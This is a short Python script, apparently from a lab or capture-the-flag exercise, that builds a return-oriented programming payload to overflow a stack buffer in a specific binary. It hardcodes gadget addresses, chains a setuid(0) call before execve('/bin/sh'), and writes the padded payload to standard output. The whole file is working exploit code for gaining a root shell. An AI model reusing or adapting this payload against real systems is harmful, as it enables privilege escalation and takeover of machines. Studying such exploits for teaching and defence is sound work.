#!/usr/bin/env python3

import sys

"""
Return-Oriented Programming (ROP) Chain Demonstration
-----------------------------------------------------

This script builds a ROP chain to bypass DEP by chaining together
existing instruction "gadgets" to invoke system calls.
"""

# rbp-0x70 : start of buffer
# location of bin/sh " 0x7ffffff291e0"
# syscall address : 0x000000000041b506
# pop rdi: 0x000000000040250f : pop rdi ; ret
# pop rax: 0x0000000000456587 : pop rax ; ret
# pop rsi: 0x000000000040a57e : pop rsi ; ret
# pop rdx: 0x000000000048c0ab : pop rdx ; pop rbx ; ret
# disatnce from start of buf to return: 0x78 = 120
# length of bin/sh: 8
# padding to get to return: 112
padding = 112

popRax = 0x0000000000456587.to_bytes(8, "little")
popRdi = 0x000000000040250f.to_bytes(8, "little")
popRsi = 0x000000000040a57e.to_bytes(8, "little")
popRdx = 0x000000000048c0ab.to_bytes(8, "little")
binshAddress = 0x7ffffff291e0.to_bytes(8, "little")
sysReturn = 0x000000000041b506.to_bytes(8, "little")

execveSys = (59).to_bytes(8, "little")
setUidSys = (105).to_bytes(8, "little")
passingZero = (0).to_bytes(8, "little")

execveChain = popRax + execveSys + popRdi + binshAddress + popRsi + passingZero + popRdx + passingZero + passingZero + sysReturn

setUidChain = popRax + setUidSys + popRdi + passingZero + sysReturn

sys.stdout.buffer.write(b"/bin/sh\x00" + b"A" * padding + setUidChain + execveChain)
